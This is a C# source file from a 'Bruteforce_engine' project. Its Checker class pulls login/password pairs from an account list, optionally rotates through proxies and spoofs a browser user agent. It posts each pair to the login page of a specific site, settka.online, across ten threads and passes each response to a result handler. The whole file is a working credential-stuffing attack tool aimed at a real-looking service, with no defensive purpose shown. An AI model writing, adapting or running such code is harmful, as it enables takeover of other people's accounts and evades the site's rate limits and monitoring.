using Bruteforce_engine.AccManager;
using Bruteforce_engine.ResponseManager;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xNet;

namespace Bruteforce_engine.CheckerCore
{
    public class Checker
    {
        RsManager rsm = new RsManager();
        Object Sync = new Object();
        Thread[] Threads;
        private string link = "http://settka.online/login.html?returnto=http://settka.online/browse/";

        public void check()
        {
            while (true) 
            {
                string[] lp = AMCore.GetAccount();
                string login = lp[0];
                string pass = lp[1];
                string content = "";
                var request = new HttpRequest();
                request.UserAgent = Http.OperaUserAgent();
                var reqParams = new RequestParams();
                request.CharacterSet = Encoding.GetEncoding("UTF-8");
                if (Globals.arrProx.Count > 0)
                {
                    request.Proxy = HttpProxyClient.Parse(AMCore.GetProxy());
                }

                reqParams["username"] = login;
                reqParams["password"] = pass;
                reqParams["login"] = "Войти";

                content = request.Post(link, reqParams).ToString();
                rsm.Pick(content,login,pass);
                if (Globals.indexSrc == Globals.arrAcc.Count) { break; }
            }
        }

        public void CreateThreads()
        {
            Threads = new Thread[100];
            for (int i = 0; i < 10; i++)
            {
                Threads[i] = new Thread(this.check);
                Threads[i].IsBackground = true;
                Threads[i].Start();
                Globals.threadsCount++;
            }
        }

        public static void StopThreads()
        {
            for (int i = 0; i < 100; i++)
            {
                //Threads[i].Abort();
            }
        }
    }
}
